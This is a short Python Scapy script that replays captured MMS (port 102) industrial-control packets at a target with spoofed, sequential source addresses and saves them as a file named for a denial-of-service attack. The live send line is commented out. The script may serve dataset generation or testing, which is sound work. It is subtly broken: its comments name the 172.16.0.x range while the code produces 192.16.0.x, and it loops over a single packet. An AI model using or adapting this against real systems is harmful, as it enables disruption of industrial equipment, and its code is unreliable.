from scapy.all import *
from scapy.layers.inet import IP, TCP


# Define the target IP and MMS port (102)
target_ip = "192.168.1.10"
target_port = 102

# Function to generate sequential IP addresses in the 172.16.0.x range
def sequential_ip(start, end):
    for i in range(start, end + 1):
        yield f"192.16.0.{i}"

# Load the MMS pcap file
packetsS = rdpcap('ABB1.pcap')

packets = packetsS[2]


# Use sequential IPs within the 172.16.0.0/24 subnet
start_ip = 1  # Start at 172.16.0.1
end_ip = 254  # End at 172.16.0.254

# Iterate over the packets and change the source IP
ip_generator = sequential_ip(start_ip, end_ip)

for pkt in packets:
    # Check if packet has an IP layer and is destined for the target port
    if IP in pkt and pkt[TCP].dport == target_port:
        # Modify the source IP with the next one in the sequence
        pkt[IP].src = next(ip_generator)
        pkt[IP].dst = target_ip
        
        # Recalculate checksums for modified packet
        del pkt[IP].chksum
        del pkt[TCP].chksum
        
        # Send the modified packet
        # send(pkt, verbose=0)
        wrpcap("mms_attack_dos.pcap", pkt, append=True)
